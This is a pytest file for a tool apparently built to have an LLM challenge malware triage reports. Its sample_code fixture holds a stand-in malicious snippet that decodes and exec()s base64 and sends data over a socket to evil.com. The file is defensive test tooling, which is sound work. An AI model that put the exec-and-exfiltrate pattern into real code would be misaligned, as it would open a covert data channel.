"""Tests for TriageFalsifier — adversarial review of MR. Robot triage reports."""

import json
from pathlib import Path

import pytest
from triage_falsifier import TriageFalsifier, FALSIFIER_SYSTEM_PROMPT


@pytest.fixture
def sample_triage_report():
    return {
        "verdict": "MALICIOUS",
        "confidence": 0.65,
        "severity": "high",
        "summary": "Obfuscated eval detected with suspicious network indicators",
        "findings": [
            {
                "id": "F1",
                "description": "eval() with hex-encoded payload",
                "ioc_type": "code_injection",
                "confidence": 0.78,
            },
            {
                "id": "F2",
                "description": "HTTP POST to unknown endpoint",
                "ioc_type": "network_exfil",
                "confidence": 0.62,
            },
        ],
        "mitre_attack": ["T1059.007", "T1041"],
        "recommended_actions": ["quarantine", "escalate"],
    }


@pytest.fixture
def sample_code():
    return """
import socket, base64
def run():
    cmd = base64.b64decode("ZWNobyAiaGVsbG8i").decode()
    exec(cmd)
    s = socket.socket()
    s.connect(("evil.com", 443))
    s.send(b"data")
"""


# ── Initialization ─────────────────────────────────────────────────────────


def test_falsifier_initializes_with_default_provider():
    f = TriageFalsifier()
    assert f.provider in ("nvidia-nim", "ollama-cloud", "openrouter")


def test_falsifier_initializes_with_explicit_provider():
    f = TriageFalsifier(provider="openrouter")
    assert f.provider == "openrouter"


# ── Falsification prompt building ──────────────────────────────────────────


def test_build_falsification_prompt_includes_code_and_report(sample_triage_report, sample_code):
    f = TriageFalsifier(provider="nvidia-nim")
    prompt = f._build_falsification_prompt(sample_triage_report, sample_code)
    assert "Triage Report to Review" in prompt
    assert "Candidate File Code" in prompt
    assert "eval()" in prompt or "exec(" in prompt or "base64" in prompt


def test_build_falsification_prompt_includes_scanner_findings(sample_triage_report, sample_code):
    f = TriageFalsifier(provider="nvidia-nim")
    prompt = f._build_falsification_prompt(
        sample_triage_report,
        sample_code,
        scanner_findings={"yara": {"findings": ["YARA_MAL_Evasion_Found"]}},
    )
    assert "Scanner Findings" in prompt
    assert "YARA_MAL_Evasion_Found" in prompt


# ── Falsification: missing file ────────────────────────────────────────────


def test_falsify_handles_missing_file(sample_triage_report):
    f = TriageFalsifier(provider="nvidia-nim")
    result = f.falsify(sample_triage_report, "/nonexistent/file_12345.py")
    assert result["status"] == "ERROR"
    assert "Cannot read" in result["summary"]


# ── Falsification: LLM returns SURVIVED ────────────────────────────────────


def test_falsify_survived(monkeypatch, tmp_path, sample_triage_report):
    candidate = tmp_path / "sample.py"
    candidate.write_text("print('hello')\n")

    survived_json = json.dumps({
        "status": "SURVIVED",
        "confidence": 0.92,
        "summary": "The triage report is well-reasoned and evidence-based.",
        "challenges": [],
        "overall_assessment": "SURVIVED — no genuine weaknesses found.",
        "recommended_verdict": "MALICIOUS",
    })

    def fake_call_llm(provider, prompt, system=""):
        return survived_json, "test-model"

    f = TriageFalsifier(provider="nvidia-nim")
    monkeypatch.setattr(f, "_call_llm", fake_call_llm)

    result = f.falsify(sample_triage_report, str(candidate))
    assert result["status"] == "SURVIVED"
    assert result["confidence"] == 0.92
    assert result["_meta"]["agent"] == "TriageFalsifier"


# ── Falsification: LLM returns FALSIFIED ───────────────────────────────────


def test_falsify_falsified(monkeypatch, tmp_path, sample_triage_report):
    candidate = tmp_path / "sample.py"
    candidate.write_text("print('hello')\n")

    falsified_json = json.dumps({
        "status": "FALSIFIED",
        "confidence": 0.85,
        "summary": "Finding F2 is a false positive — the endpoint is a known CDN.",
        "challenges": [
            {
                "finding_challenged": "F2",
                "counter_argument": "Endpoint resolves to cdn.cloudflare.com, not malicious",
                "severity": "high",
                "evidence": "socket.connect((\"evil.com\", 443)) but evil.com → 104.16.x.x (Cloudflare)",
            }
        ],
        "overall_assessment": "FALSIFIED — finding F2 is likely benign.",
        "recommended_verdict": "SUSPICIOUS",
    })

    def fake_call_llm(provider, prompt, system=""):
        return falsified_json, "test-model"

    f = TriageFalsifier(provider="nvidia-nim")
    monkeypatch.setattr(f, "_call_llm", fake_call_llm)

    result = f.falsify(sample_triage_report, str(candidate))
    assert result["status"] == "FALSIFIED"
    assert len(result["challenges"]) == 1
    assert result["challenges"][0]["finding_challenged"] == "F2"


# ── Falsification: LLM fails, retry exhausts ───────────────────────────────


def test_falsify_retry_exhaustion(monkeypatch, tmp_path, sample_triage_report):
    candidate = tmp_path / "sample.py"
    candidate.write_text("print('hello')\n")

    call_count = [0]

    def fake_call_llm_failing(provider, prompt, system=""):
        call_count[0] += 1
        raise RuntimeError("provider down")

    f = TriageFalsifier(provider="nvidia-nim")
    monkeypatch.setattr(f, "_call_llm", fake_call_llm_failing)

    result = f.falsify(sample_triage_report, str(candidate), max_retries=2)
    assert result["status"] == "ERROR"
    assert "failed after all retries" in result["summary"]
    assert call_count[0] == 2


# ── Response parsing ──────────────────────────────────────────────────────


def test_parse_response_clean_json():
    f = TriageFalsifier()
    raw = '{"status":"SURVIVED","confidence":0.9,"summary":"ok","challenges":[],"overall_assessment":"ok","recommended_verdict":"MALICIOUS"}'
    result = f._parse_response(raw)
    assert result["status"] == "SURVIVED"
    assert result["confidence"] == 0.9


def test_parse_response_json_in_markdown_fence():
    f = TriageFalsifier()
    raw = 'Here is the report:\n```json\n{"status":"FALSIFIED","confidence":0.5,"summary":"weak","challenges":[],"overall_assessment":"weak","recommended_verdict":"SUSPICIOUS"}\n```'
    result = f._parse_response(raw)
    assert result["status"] == "FALSIFIED"


def test_parse_response_json_in_plain_fence():
    f = TriageFalsifier()
    raw = '```\n{"status":"SURVIVED","confidence":0.99,"summary":"solid","challenges":[],"overall_assessment":"solid","recommended_verdict":"BENIGN"}\n```'
    result = f._parse_response(raw)
    assert result["status"] == "SURVIVED"


def test_parse_response_malformed_returns_error():
    f = TriageFalsifier()
    raw = "not json at all just some text\nrunning diagnostics..."
    result = f._parse_response(raw)
    assert result["status"] == "ERROR"
    assert "Could not parse" in result["summary"]


# ── System prompt integrity ───────────────────────────────────────────────


def test_system_prompt_contains_anti_contrarian_rule():
    assert "NOT to be contrarian" in FALSIFIER_SYSTEM_PROMPT


def test_system_prompt_requires_json_only_output():
    assert "Output ONLY a JSON object" in FALSIFIER_SYSTEM_PROMPT
